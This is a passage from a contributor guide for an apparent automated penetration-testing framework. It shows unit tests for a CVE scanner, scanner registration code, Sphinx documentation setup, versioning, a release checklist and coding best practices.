            "vendor": "Apache Software Foundation"
        })
        assert scanner.validate_target(valid_json) is True
        
    def test_target_validation_invalid(self, scanner):
        """Test validation rejects invalid targets."""
        invalid_targets = [
            "",
            "just-service-name",
            "invalid:json:format",
            '{"missing": "service_field"}'
        ]
        for target in invalid_targets:
            assert scanner.validate_target(target) is False
    
    @patch('src.scanners.vulnerability.cve_scanner.requests.get')
    def test_successful_cve_scan(self, mock_get, scanner, mock_api_response):
        """Test successful CVE scan execution."""
        # Mock API response
        mock_response = Mock()
        mock_response.json.return_value = mock_api_response
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response
        
        # Execute scan
        result = scanner.scan("apache:2.4.41")
        
        # Assertions
        assert isinstance(result, ScanResult)
        assert result.status == ScanStatus.COMPLETED
        assert result.scanner_name == "cve_scanner"
        assert len(result.findings) > 0
        
        # Check finding structure
        finding = result.findings[0]
        assert "cve_id" in finding
        assert "severity" in finding
        assert "cvss_score" in finding
        assert "recommendation" in finding
        
    @patch('src.scanners.vulnerability.cve_scanner.requests.get')
    def test_api_error_handling(self, mock_get, scanner):
        """Test handling of API errors."""
        mock_get.side_effect = requests.RequestException("API Error")
        
        result = scanner.scan("apache:2.4.41")
        assert result.status == ScanStatus.FAILED
        assert len(result.errors) > 0
        assert "API Error" in result.errors[0]
    
    def test_severity_sorting(self, scanner):
        """Test findings are sorted by severity correctly."""
        findings = [
            {"severity": "LOW", "cve_id": "CVE-2021-1"},
            {"severity": "CRITICAL", "cve_id": "CVE-2021-2"},
            {"severity": "HIGH", "cve_id": "CVE-2021-3"},
            {"severity": "MEDIUM", "cve_id": "CVE-2021-4"}
        ]
        
        findings.sort(key=lambda x: scanner._severity_sort_key(x["severity"]))
        
        expected_order = ["CRITICAL", "HIGH", "MEDIUM", "LOW"]
        actual_order = [f["severity"] for f in findings]
        assert actual_order == expected_order
```

### **Integrating the Scanner**

```python
# src/scanners/__init__.py

from .recon.port_scanner import PortScanner  
from .recon.dns_scanner import DNSScanner
from .vulnerability.web_scanner import WebScanner
from .vulnerability.directory_scanner import DirectoryScanner
from .vulnerability.ssl_scanner import SSLScanner
from .vulnerability.cve_scanner import CVEScanner  # Add new scanner

# Scanner registry for dynamic loading
SCANNER_REGISTRY = {
    "port_scanner": PortScanner,
    "dns_scanner": DNSScanner, 
    "web_scanner": WebScanner,
    "directory_scanner": DirectoryScanner,
    "ssl_scanner": SSLScanner,
    "cve_scanner": CVEScanner  # Register new scanner
}

def get_scanner(scanner_name: str):
    """Get scanner class by name."""
    return SCANNER_REGISTRY.get(scanner_name)

def list_scanners():
    """List all available scanners."""
    return list(SCANNER_REGISTRY.keys())

__all__ = [
    "PortScanner",
    "DNSScanner", 
    "WebScanner",
    "DirectoryScanner",
    "SSLScanner",
    "CVEScanner",
    "SCANNER_REGISTRY",
    "get_scanner",
    "list_scanners"
]
```

---

## 📚 **Documentation Guidelines**

### **API Documentation**

We use Sphinx for generating API documentation:

```python
# docs/conf.py - Sphinx Configuration

import os
import sys
sys.path.insert(0, os.path.abspath('../src'))

# Project information
project = 'Auto-Pentest Framework'
copyright = '2024, Security Team'
author = 'Security Team'
version = '0.9.1'
release = '0.9.1'

# Extensions
extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.viewcode',
    'sphinx.ext.napoleon',
    'sphinx.ext.intersphinx',
    'sphinx_rtd_theme'
]

# Theme
html_theme = 'sphinx_rtd_theme'
html_theme_options = {
    'collapse_navigation': False,
    'sticky_navigation': True,
    'navigation_depth': 4,
}

# Napoleon settings for Google-style docstrings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_init_with_doc = False
napoleon_include_private_with_doc = False
```

### **Building Documentation**

```bash
# Generate API documentation
cd docs/
sphinx-apidoc -o api/ ../src/
sphinx-build -b html . _build/html

# Or use make (if Makefile exists)
make html

# View documentation
open _build/html/index.html
```

---

## 🚀 **Release Management**

### **Version Management**

```python
# src/__init__.py

__version__ = "0.9.1"
__author__ = "Security Team"
__email__ = "security@company.com"
__license__ = "MIT"

# Version info tuple for programmatic access
VERSION_INFO = (0, 9, 1)

def get_version():
    """Get version string."""
    return __version__

def get_version_info():
    """Get version info tuple."""
    return VERSION_INFO
```

### **Release Checklist**

```markdown
# Release Checklist v0.9.1

## Pre-Release
- [ ] All tests passing (pytest --cov=src)
- [ ] Code quality checks pass (black, isort, flake8, mypy)
- [ ] Documentation updated and builds successfully
- [ ] CHANGELOG.md updated with new features and fixes
- [ ] Version numbers updated (__init__.py, setup.py, pyproject.toml)
- [ ] Security review completed (bandit, safety)
- [ ] Performance benchmarks verified
- [ ] Breaking changes documented
- [ ] Migration guide created (if needed)

## Release Process
- [ ] Create release branch from develop
- [ ] Final integration testing on release branch
- [ ] Tag release version (git tag v0.9.1)
- [ ] Build release artifacts (pip wheel)
- [ ] Create GitHub release with notes
- [ ] Upload artifacts to PyPI (if applicable)
- [ ] Deploy documentation updates

## Post-Release
- [ ] Verify release deployment
- [ ] Update documentation sites
- [ ] Announce release (internal/external)
- [ ] Monitor for critical issues
- [ ] Merge release branch back to main and develop
- [ ] Update project boards and issue tracking
```

---

## 🎯 **Best Practices Summary**

### **Code Quality**
- Follow PEP 8 style guide with Black formatting
- Use type hints for all function parameters and returns
- Write comprehensive docstrings with examples
- Maintain test coverage above 90%
- Use meaningful variable and function names
- Keep functions small and focused (single responsibility)

### **Security**
- Always validate and sanitize inputs
- Use parameterized commands to prevent injection
- Implement proper error handling without exposing internals
- Log security events appropriately
- Follow principle of least privilege
- Regular security audits with automated tools

### **Performance**
- Use caching where appropriate
- Implement proper resource management
- Monitor memory usage and optimize for large datasets
- Use async/await for I/O bound operations
- Profile performance-critical code paths
- Implement graceful degradation for resource constraints

### **Testing**
- Write tests before implementing features (TDD)
- Include unit, integration, and end-to-end tests
- Use mocks appropriately to isolate units under test
- Test both success and failure scenarios
- Include edge cases and boundary conditions
- Maintain test data fixtures separately

### **Documentation**
- Document all public APIs comprehensively
- Include usage examples in documentation
- Keep README files up to date
- Document configuration options and environment variables
- Provide troubleshooting guides
- Include architecture diagrams for complex systems

---

This development guide provides a comprehensive foundation for contributing to the Auto-Pentest Framework. The framework's modular architecture, comprehensive testing, and detailed documentation make it straightforward to add new features, fix bugs, and extend functionality while maintaining high code quality and security standards.

**Happy coding! 🚀**